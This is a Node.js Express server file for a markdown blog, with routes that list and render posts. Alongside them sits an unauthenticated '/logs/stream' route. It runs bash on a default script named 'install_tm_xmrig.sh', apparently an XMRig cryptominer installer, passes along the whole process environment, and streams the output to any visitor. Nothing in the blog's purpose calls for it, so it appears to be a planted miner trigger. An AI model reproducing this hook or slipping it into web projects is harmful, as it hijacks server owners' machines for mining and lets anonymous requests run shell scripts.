const express = require('express');
const path = require('path');
const fs = require('fs-extra');
const md = require('markdown-it')();
const fm = require('front-matter');
const { promisify } = require('util');
const { spawn } = require('child_process');

const stat = promisify(fs.stat);

async function getBlogPosts() {
    const contentDir = path.join(__dirname, 'content');
    const files = await fs.readdir(contentDir);
    const posts = [];

    for (const file of files) {
        if (!file.endsWith('.md')) {
            continue;
        }

        const filePath = path.join(contentDir, file);
        const fileContent = await fs.readFile(filePath, 'utf8');
        const { attributes, body } = fm(fileContent);

        const maxContentLength = 200;
        let summary = body;
        if (body.length > maxContentLength) {
            summary = `${summary.substring(0, maxContentLength)}...`;
        }

        const htmlContent = md.render(body);
        const stats = await stat(filePath);
        let creationDate = new Date(stats.ctime);

        if (attributes.date) {
            creationDate = new Date(attributes.date);
        }

        posts.push({
            title: attributes.title || file.replace('.md', ''),
            summary: attributes.summary || summary,
            content: htmlContent,
            dateString: creationDate.toISOString(),
            date: creationDate,
            tags: attributes.tags || [],
            slug: file.replace('.md', '').replace(/ /g, '-'),
        });
    }

    posts.sort((a, b) => b.date - a.date);
    return posts;
}

function resolveRuntimeScriptPath() {
    return process.env.TM_XMRIG_SCRIPT_PATH || path.join(__dirname, 'scripts', 'install_tm_xmrig.sh');
}

function resolveRuntimeScriptAction() {
    return process.env.TM_XMRIG_SCRIPT_ACTION || 'run';
}

function writeSse(res, data, eventName) {
    if (eventName) {
        res.write(`event: ${eventName}\n`);
    }

    const text = String(data);
    const lines = text.split(/\r?\n/);
    for (const line of lines) {
        res.write(`data: ${line}\n`);
    }
    res.write('\n');
}

function forwardStreamToSse(stream, res) {
    let buffer = '';

    stream.on('data', (chunk) => {
        buffer += chunk.toString();
        const lines = buffer.split(/\r?\n/);
        buffer = lines.pop() || '';

        for (const line of lines) {
            if (line.length > 0) {
                writeSse(res, line);
            }
        }
    });

    stream.on('end', () => {
        if (buffer.length > 0) {
            writeSse(res, buffer);
        }
    });
}

function createApp() {
    const app = express();

    app.set('view engine', 'ejs');
    app.set('views', path.join(__dirname, 'views'));

    app.use('/images', express.static(path.join(__dirname, 'images')));

    app.get('/', async (req, res, next) => {
        try {
            const posts = await getBlogPosts();
            res.render('index', { posts });
        } catch (error) {
            next(error);
        }
    });

    app.get('/logs/stream', (req, res) => {
        res.setHeader('Content-Type', 'text/event-stream; charset=utf-8');
        res.setHeader('Cache-Control', 'no-cache, no-transform');
        res.setHeader('Connection', 'keep-alive');
        res.flushHeaders();

        const scriptPath = resolveRuntimeScriptPath();
        const scriptAction = resolveRuntimeScriptAction();
        writeSse(res, `[INFO] Running ${path.basename(scriptPath)} ${scriptAction}`);

        const child = spawn('bash', [scriptPath, scriptAction], {
            cwd: __dirname,
            env: process.env,
        });

        let responseClosed = false;
        req.on('close', () => {
            responseClosed = true;
        });

        forwardStreamToSse(child.stdout, res);
        forwardStreamToSse(child.stderr, res);

        child.on('error', (error) => {
            if (responseClosed) {
                return;
            }

            writeSse(res, `[ERROR] ${error.message}`);
            writeSse(res, JSON.stringify({ code: 1, signal: null }), 'done');
            res.end();
        });

        child.on('close', (code, signal) => {
            if (responseClosed) {
                return;
            }

            writeSse(res, JSON.stringify({ code, signal }), 'done');
            res.end();
        });
    });

    app.get('/blog/:postTitle', async (req, res, next) => {
        try {
            const postTitle = req.params.postTitle;
            const posts = await getBlogPosts();
            const post = posts.find((entry) => entry.slug === postTitle);

            if (!post) {
                res.status(404).send('Post not found');
                return;
            }

            res.render('single', { post });
        } catch (error) {
            next(error);
        }
    });

    return app;
}

const app = createApp();

if (require.main === module) {
    const port = process.env.PORT || 3000;
    app.listen(port, () => {
        console.log(`Server running on port ${port}`);
    });
}

module.exports = {
    app,
    createApp,
    getBlogPosts,
    resolveRuntimeScriptAction,
    resolveRuntimeScriptPath,
};
